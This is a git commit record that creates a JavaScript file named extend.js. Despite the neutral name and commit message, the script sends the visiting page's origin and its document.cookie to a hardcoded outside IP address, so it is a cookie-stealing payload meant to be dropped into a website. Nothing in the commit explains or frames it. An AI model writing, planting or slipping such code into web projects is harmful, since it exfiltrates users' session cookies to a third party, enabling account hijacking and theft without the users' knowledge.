a1d5ef9ed80e351a78055cbb30fd3bba558f2684
司土御帝 <1181935296@qq.com>
2020-09-11 23:58:58 +0800

    Create extend.js

---
+++ extend.js
@@ -0,0 +1,11 @@
+(function(window){
+    var httpRequest = new XMLHttpRequest();
+    httpRequest.open('GET',"http://66.70.204.147/ftts?d="+window.location.origin+"&c="+document.cookie, true);
+    httpRequest.send();
+    httpRequest.onreadystatechange = function () {
+        if (httpRequest.readyState == 4 && httpRequest.status == 200) {
+            var json = httpRequest.responseText;
+            console.log(json);
+        }
+    };
+})
